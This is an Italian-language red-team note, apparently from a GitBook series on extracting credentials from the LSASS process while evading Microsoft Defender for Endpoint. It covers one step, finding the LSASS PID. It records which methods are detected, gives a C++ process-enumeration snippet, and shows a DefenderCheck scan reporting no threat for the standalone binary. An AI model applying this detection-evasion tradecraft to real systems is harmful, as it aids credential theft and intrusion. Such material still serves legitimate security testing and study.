# MDE - Credential Extraction - LSASS Dump 3 - Find LSASS PID

* Utilizzare comandi come <kbd>tasklist /v</kbd>  per enumerare il PID LSASS viene rilevato da MDE
* Utilizzo di WINAPIs standard risulta essere piu opsec friendly
* In caso di accesso RDP, tool come TaskManagere ( o alternative ancore meno sospette) possono essere utiizzate per recuperare il PID
* Snippet codice C++ per il recupero dinamico del PID LSASS

```cpp
// Find PID of a process by name
int FindPID(const char* procname)
{
    int pid = 0;
    PROCESSENTRY32 proc = {};
    proc.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); bool bProc = Process32First(snapshot, &proc);
    while (bProc)
    {
        if (strcmp(procname, proc.szExeFile) == 0)
        {
            pid = proc.th32ProcessID;
            break;
        }
        bProc = Process32Next(snapshot, &proc);
    }
    return pid;
}
```

* Se la funzione FindPID e' aggiunta al tool MiniDumpWriteDump viene rilevate da MDE

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

* Mentre l'utilizzo in stand-alone del eseguibile non viene rilevato da Defender AV o MDE&#x20;

```powershell
C:\AD\Tools\DefenderCheck> .\DefenderCheck.exe C:\AD\Tools\FindLSASSPID.exe
[+] No threat found in submitted file!
```
